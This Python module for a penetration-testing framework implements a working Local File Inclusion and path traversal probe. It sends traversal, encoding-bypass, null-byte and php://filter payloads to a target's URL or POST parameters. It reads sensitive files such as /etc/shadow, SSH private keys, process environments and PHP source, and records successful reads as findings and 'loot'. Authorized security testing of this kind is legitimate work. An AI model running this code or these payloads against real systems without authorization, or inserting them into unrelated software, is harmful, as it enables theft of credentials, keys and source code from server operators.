"""Local File Inclusion / path traversal probe.

Fuzzes URL query parameters (or a POST body) with a bounded set of directory
traversal and wrapper-based payloads, looking for deterministic evidence that
the target server returned the contents of a file it should not have:

    * ``/etc/passwd``-style entries (``root:...:0:0:``)
    * Windows ``win.ini`` section headers (``[fonts]`` / ``[extensions]``)
    * a base64 blob (via ``php://filter/convert.base64-encode/resource=``)
      that decodes into recognizable PHP/source content

Design constraints (redkit invariants):
    * NO AI/LLM usage - every decision here is a deterministic regex/signature
      match against response bodies.
    * Pure standard library (``urllib``, ``re``, ``base64``). No third-party
      dependency at all.
    * Imports and runs on both Windows and Linux (no OS-specific calls at
      import time; traversal payloads are built for both path styles).
    * Offline-first: target files come from the bundled ``lfi-files.txt``
      wordlist via :mod:`redkit.core.config`.
    * Bounded and safe: capped file/parameter/depth counts, a hard ceiling on
      total requests sent, a capped thread pool, and GET-by-default probing
      (POST is only used when the operator explicitly sets ``method=POST``).
"""
from __future__ import annotations

import base64
import itertools
import re
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, List, Optional, Tuple

from redkit.core.module import Module, Option, Result
from redkit.core.registry import register
from redkit.core.http import WEB_COMMON_OPTIONS, Response, client_from_opts
from redkit.core import config

# --------------------------------------------------------------------------- #
# bounds (redkit invariant: bounded and safe)
# --------------------------------------------------------------------------- #
MAX_DEPTH = 12                 # hard clamp on the operator-supplied 'depth'
MAX_FILES = 10                 # target files considered from lfi-files.txt
MAX_PARAMS = 5                 # parameters fuzzed per run
MAX_PHP_RESOURCES = 5           # php://filter resource candidates
MAX_TOTAL_ATTEMPTS = 250       # hard ceiling on total requests sent
THREADS = 10                   # internal worker count (<=20 per invariant)
MAX_DECODE_LEN = 200_000       # cap on bytes considered for base64 decoding

# Common parameter names used only when the target URL/body has no query
# parameters at all and the operator did not pin one with -o param=.
_FALLBACK_PARAMS = ["file", "page", "path", "doc", "template"]

_WIN_DRIVE_RE = re.compile(r"^[A-Za-z]:[\\/](.+)$")
_B64_CHARSET_RE = re.compile(r"^[A-Za-z0-9+/=\s]+$")

# basename (lower-case) -> (compiled signature regex, human label)
_SIGNATURES: Dict[str, Tuple[re.Pattern, str]] = {
    "passwd": (re.compile(r"root:[^:\n]*:0:0:"), "root:...:0:0: entry from /etc/passwd"),
    "shadow": (re.compile(r"root:[$!*][\w./$]*:"), "root password hash from /etc/shadow"),
    "win.ini": (re.compile(r"\[fonts\]|\[extensions\]", re.I), "[fonts]/[extensions] section from win.ini"),
    "boot.ini": (re.compile(r"\[boot loader\]", re.I), "[boot loader] section from boot.ini"),
    "id_rsa": (re.compile(r"-----BEGIN (RSA |OPENSSH )?PRIVATE KEY-----"), "PEM private key header"),
    "sshd_config": (
        re.compile(r"(?im)^\s*(PermitRootLogin|ChallengeResponseAuthentication|Subsystem)\b"),
        "sshd_config directive",
    ),
    "hosts": (re.compile(r"127\.0\.0\.1\s+localhost"), "127.0.0.1 localhost entry from hosts file"),
    "os-release": (re.compile(r"(?m)^(PRETTY_NAME=|ID_LIKE=|ID=)"), "os-release contents"),
    "resolv.conf": (re.compile(r"nameserver\s+\d{1,3}(\.\d{1,3}){3}"), "nameserver entry from resolv.conf"),
    "environ": (re.compile(r"PATH=/[^\x00]*"), "environment variable dump from /proc/self/environ"),
    "version": (re.compile(r"Linux version \d"), "/proc/version contents"),
    "status": (re.compile(r"(?m)^State:\s+\S"), "/proc/self/status contents"),
    "group": (re.compile(r"(?m)^root:x:0:"), "root:x:0: entry from /etc/group"),
    "issue": (
        re.compile(r"\\n\s*\\l|\\r\s+on\s+an\s+\\m", re.I),
        r"'\n \l' / 'Kernel \r on an \m' escape-code banner from /etc/issue",
    ),
}


# --------------------------------------------------------------------------- #
# pure helpers (payload construction / detection)
# --------------------------------------------------------------------------- #
def _basename(path: str) -> str:
    return re.split(r"[\\/]", path.strip())[-1] if path else ""


def _relative_path(raw: str) -> str:
    """Strip a leading slash or Windows drive prefix, forward-slash separated."""
    m = _WIN_DRIVE_RE.match(raw.strip())
    if m:
        return m.group(1).replace("\\", "/")
    return raw.strip().lstrip("/")


def _load_target_files() -> List[str]:
    """Read the bundled lfi-files.txt wordlist. Tolerant of a missing file."""
    path = config.wordlist("lfi-files.txt")
    try:
        text = path.read_text(encoding="utf-8", errors="ignore")
    except OSError:
        return []
    return [line.strip() for line in text.splitlines() if line.strip() and not line.strip().startswith("#")]


#: fixed priority so the canonical cross-platform targets are always inside
#: the MAX_FILES cap, even though the bundled wordlist lists Linux entries
#: before Windows ones.
_PRIORITY_BASENAMES = [
    "passwd", "win.ini", "shadow", "boot.ini", "id_rsa", "sshd_config",
    "hosts", "resolv.conf", "os-release", "environ", "version", "status",
    "group", "issue",
]


def _select_target_files(all_targets: List[str], cap: int) -> List[str]:
    """Prioritize files we can actually verify via a known signature, biased
    toward covering both Unix and Windows targets within the cap."""
    def rank(path: str) -> int:
        base = _basename(path).lower()
        try:
            return _PRIORITY_BASENAMES.index(base)
        except ValueError:
            return len(_PRIORITY_BASENAMES) if base in _SIGNATURES else len(_PRIORITY_BASENAMES) + 1

    ordered = sorted(all_targets, key=rank)
    return ordered[:cap]


def _php_resources(all_targets: List[str], cap: int) -> List[str]:
    """Candidate resource names for the php://filter base64 wrapper."""
    seen: set = set()
    out: List[str] = []
    for t in all_targets:
        if t.lower().endswith(".php"):
            name = _basename(t)
            if name not in seen:
                seen.add(name)
                out.append(name)
    return out[:cap]


def _build_attempts(target_files: List[str], php_resources: List[str], depth: int) -> List[Dict[str, str]]:
    """Build the (parameter-independent) list of traversal/wrapper attempts.

    Per file: `depth` plain '../' attempts (depth 1..depth) plus one attempt
    each for the encoded/bypass/null-byte techniques (all using `depth`
    repeats), for a bounded total of ``depth + 5`` attempts per file.
    """
    attempts: List[Dict[str, str]] = []
    for raw in target_files:
        rel = _relative_path(raw)
        for n in range(1, depth + 1):
            attempts.append(
                {"kind": "file", "target": raw, "technique": f"traversal (../ x{n})", "payload": "../" * n + rel}
            )
        attempts.append(
            {"kind": "file", "target": raw, "technique": "url-encoded traversal (%2e%2e%2f)",
             "payload": "%2e%2e%2f" * depth + rel}
        )
        attempts.append(
            {"kind": "file", "target": raw, "technique": "double url-encoded traversal (%252e%252e%252f)",
             "payload": "%252e%252e%252f" * depth + rel}
        )
        attempts.append(
            {"kind": "file", "target": raw, "technique": "....// filter-bypass traversal",
             "payload": "....//" * depth + rel}
        )
        attempts.append(
            {"kind": "file", "target": raw, "technique": "leading / absolute path", "payload": raw.strip()}
        )
        attempts.append(
            {"kind": "file", "target": raw, "technique": "legacy null-byte truncation (%00)",
             "payload": "../" * depth + rel + "%00"}
        )
    for res in php_resources:
        attempts.append(
            {
                "kind": "php",
                "target": res,
                "technique": "php://filter base64 source disclosure",
                "payload": f"php://filter/convert.base64-encode/resource={res}",
            }
        )
    return attempts


def _decode_php_filter(text: str) -> Optional[str]:
    """Try to base64-decode a php://filter response; None unless it plausibly
    decodes into PHP/source content (keeps the check conservative)."""
    candidate = (text or "").strip()
    if not candidate or len(candidate) > MAX_DECODE_LEN:
        return None
    if not _B64_CHARSET_RE.match(candidate):
        return None
    compact = re.sub(r"\s+", "", candidate)
    if len(compact) < 8 or len(compact) % 4 != 0:
        return None
    try:
        raw = base64.b64decode(compact, validate=True)
    except Exception:  # noqa: BLE001 - any decode failure just means "no hit"
        return None
    decoded = raw.decode("utf-8", "replace")
    if not re.search(r"<\?php|<\?=|function\s+\w+\s*\(|class\s+\w+", decoded, re.I):
        return None
    return decoded


def _check_hit(att: Dict[str, str], resp: Optional[Response]) -> Optional[Tuple[str, str]]:
    """Return (signature_label, short_evidence_snippet) if `resp` proves the
    attempt succeeded; None otherwise. Tolerates transport errors/empty bodies."""
    if resp is None or resp.error or resp.status == 0 or not resp.body:
        return None
    if att["kind"] == "php":
        decoded = _decode_php_filter(resp.text)
        if not decoded:
            return None
        first_line = next((ln for ln in decoded.splitlines() if ln.strip()), "")
        return ("base64-encoded PHP source via php://filter wrapper", first_line.strip()[:160])
    sig = _SIGNATURES.get(_basename(att["target"]).lower())
    if not sig:
        return None
    pattern, label = sig
    match = pattern.search(resp.text)
    if not match:
        return None
    start = max(match.start() - 20, 0)
    snippet = resp.text[start:match.end() + 40].replace("\n", " ").replace("\r", " ").strip()
    return (label, snippet[:160])


def _set_query_param(url: str, name: str, raw_value: str) -> str:
    """Rebuild `url` with query parameter `name` set to `raw_value`, inserted
    byte-for-byte (NOT re-percent-encoded) so pre-encoded traversal payloads
    (%2e%2e%2f, %00, ...) reach the wire exactly as crafted."""
    parts = urllib.parse.urlsplit(url)
    pairs = urllib.parse.parse_qsl(parts.query, keep_blank_values=True)
    out: List[str] = []
    done = False
    for k, v in pairs:
        if k == name and not done:
            out.append(f"{urllib.parse.quote(k, safe='')}={raw_value}")
            done = True
        else:
            out.append(f"{urllib.parse.quote(k, safe='')}={urllib.parse.quote(v, safe='')}")
    if not done:
        out.append(f"{urllib.parse.quote(name, safe='')}={raw_value}")
    query = "&".join(out)
    return urllib.parse.urlunsplit((parts.scheme, parts.netloc, parts.path, query, parts.fragment))


def _set_form_param(data_template: str, name: str, raw_value: str) -> str:
    """Same idea as :func:`_set_query_param` but for an urlencoded POST body."""
    pairs = urllib.parse.parse_qsl(data_template or "", keep_blank_values=True)
    out: List[str] = []
    done = False
    for k, v in pairs:
        if k == name and not done:
            out.append(f"{urllib.parse.quote_plus(k)}={raw_value}")
            done = True
        else:
            out.append(f"{urllib.parse.quote_plus(k)}={urllib.parse.quote_plus(v)}")
    if not done:
        out.append(f"{urllib.parse.quote_plus(name)}={raw_value}")
    return "&".join(out)


def _normalize_url(raw: str) -> str:
    raw = (raw or "").strip()
    if raw and "://" not in raw:
        raw = "http://" + raw
    return raw


def _discover_params(url: str, method: str, data_template: str, explicit_param: str) -> Tuple[List[str], bool]:
    """Return (param_names, used_fallback). `used_fallback` is True when no
    parameters were found anywhere and a built-in common-name list was used."""
    explicit_param = (explicit_param or "").strip()
    if explicit_param:
        return [explicit_param], False
    if method == "POST":
        pairs = urllib.parse.parse_qsl(data_template or "", keep_blank_values=True)
    else:
        pairs = urllib.parse.parse_qsl(urllib.parse.urlsplit(url).query, keep_blank_values=True)
    names: List[str] = []
    seen: set = set()
    for k, _v in pairs:
        if k not in seen:
            seen.add(k)
            names.append(k)
    if names:
        return names[:MAX_PARAMS], False
    return list(_FALLBACK_PARAMS[:MAX_PARAMS]), True


def _do_request(client, url: str, method: str, data_template: str, param: str, att: Dict[str, str]):
    """Execute one probe request. Returns (Response, url_actually_hit)."""
    payload = att["payload"]
    if method == "POST":
        body = _set_form_param(data_template, param, payload)
        resp = client.request(
            "POST", url, data=body, headers={"Content-Type": "application/x-www-form-urlencoded"}
        )
        return resp, url
    full_url = _set_query_param(url, param, payload)
    resp = client.request("GET", full_url)
    return resp, full_url


# --------------------------------------------------------------------------- #
# module
# --------------------------------------------------------------------------- #
@register
class Lfi(Module):
    """Local File Inclusion / path traversal probe."""

    name = "web.lfi"
    description = "Local File Inclusion / path traversal probe (traversal + encoding bypasses + php://filter)"
    phase = "web"
    options = [
        Option("url", help="target URL, e.g. http://host/page.php?file=a", required=True),
        Option("param", default="", help="specific parameter to fuzz (default: all discovered query/body params)"),
        Option("method", default="GET", choices=["GET", "POST"], help="HTTP method used to send probes"),
        Option("data", default="", help="POST body template 'key=value&key2=value2' (used when method=POST)"),
        Option("depth", default=8, help="max ../ repeat depth per traversal style (capped at 12)"),
    ] + WEB_COMMON_OPTIONS
    references = [
        "https://owasp.org/www-community/attacks/Path_Traversal",
        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/"
        "05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include",
    ]

    def run(self, opts: Dict[str, object], ctx) -> Result:
        console = ctx.console
        url = _normalize_url(str(opts.get("url", "")))
        parts = urllib.parse.urlsplit(url)
        if parts.scheme not in ("http", "https") or not parts.hostname:
            return Result(ok=False, summary=f"invalid url: {opts.get('url')!r} (expected http(s)://host/...)")
        host = parts.hostname
        method = str(opts.get("method", "GET") or "GET").upper()
        data_template = str(opts.get("data", "") or "")

        depth = max(1, min(int(opts.get("depth", 8) or 8), MAX_DEPTH))

        param_names, used_fallback = _discover_params(url, method, data_template, str(opts.get("param", "")))
        if used_fallback:
            console.warn(
                f"no query/body parameters found on {url}; "
                f"falling back to common LFI parameter names: {', '.join(param_names)}"
            )

        all_targets = _load_target_files()
        if not all_targets:
            console.warn("bundled wordlist 'lfi-files.txt' is empty or missing; nothing to test")
            return Result(ok=True, summary="no target files available (lfi-files.txt empty/missing)", data={"hits": []})

        target_files = _select_target_files(all_targets, MAX_FILES)
        php_resources = _php_resources(all_targets, MAX_PHP_RESOURCES)
        attempts_template = _build_attempts(target_files, php_resources, depth)

        total_planned = len(attempts_template) * len(param_names)
        work_items: List[Tuple[str, Dict[str, str]]] = []
        for att, name in itertools.product(attempts_template, param_names):
            work_items.append((name, att))
            if len(work_items) >= MAX_TOTAL_ATTEMPTS:
                break
        capped = len(work_items) < total_planned
        if capped:
            console.warn(
                f"capping probe at {MAX_TOTAL_ATTEMPTS} requests (would be {total_planned}); "
                f"{len(target_files)} file(s), {len(php_resources)} php resource(s), "
                f"depth={depth}, {len(param_names)} param(s)"
            )

        console.info(
            f"LFI probe {url} [{method}] - {len(param_names)} param(s), {len(target_files)} file(s), "
            f"depth={depth}, {len(work_items)} request(s)"
        )

        ctx.engagement.add_host(host)

        hits: List[Dict[str, object]] = []
        seen_hits: set = set()
        sent = 0
        workers = max(1, min(THREADS, len(work_items) or 1))
        client = client_from_opts(opts)

        with ThreadPoolExecutor(max_workers=workers) as pool:
            future_map = {
                pool.submit(_do_request, client, url, method, data_template, name, att): (name, att)
                for name, att in work_items
            }
            for future in as_completed(future_map):
                name, att = future_map[future]
                try:
                    resp, final_url = future.result()
                except Exception:  # noqa: BLE001 - a single probe must never abort the run
                    continue
                sent += 1
                result = _check_hit(att, resp)
                if not result:
                    continue
                label, snippet = result
                key = (name, att["target"])
                if key in seen_hits:
                    continue
                seen_hits.add(key)
                hits.append(
                    {
                        "param": name,
                        "method": method,
                        "technique": att["technique"],
                        "target": att["target"],
                        "payload": att["payload"],
                        "url": final_url,
                        "status": resp.status if resp else 0,
                        "signature": label,
                        "evidence": snippet,
                    }
                )

        hits.sort(key=lambda h: (str(h["param"]), str(h["target"])))
        for hit in hits:
            evidence = f"payload: {hit['payload']}  |  matched signature: {hit['signature']} ({hit['evidence']})"
            ctx.engagement.add_finding(
                f"Local File Inclusion: '{hit['param']}' parameter discloses {hit['target']}",
                severity="high",
                host=host,
                description=(
                    f"HTTP {method} request to {url} with parameter '{hit['param']}' "
                    f"using {hit['technique']} returned content matching a known signature "
                    f"for {hit['target']}."
                ),
                evidence=evidence,
            )
            ctx.engagement.add_loot(host, "lfi-file", str(hit["target"]), source=str(hit["url"]))
            console.good(f"LFI: param={hit['param']} target={hit['target']} via {hit['technique']}")

        summary = (
            f"{url}: {len(hits)} LFI hit(s) across {len(param_names)} parameter(s); "
            f"{sent} request(s) sent (capped={capped})"
        )
        if not hits:
            console.info(summary)
        ctx.engagement.add_note(f"web.lfi: {summary}")

        data = {
            "url": url,
            "host": host,
            "method": method,
            "params_tested": param_names,
            "used_fallback_params": used_fallback,
            "depth": depth,
            "files_tested": target_files,
            "php_resources_tested": php_resources,
            "attempts_planned": total_planned,
            "attempts_sent": sent,
            "capped": capped,
            "hits": hits,
        }
        return Result(ok=True, summary=summary, data=data)
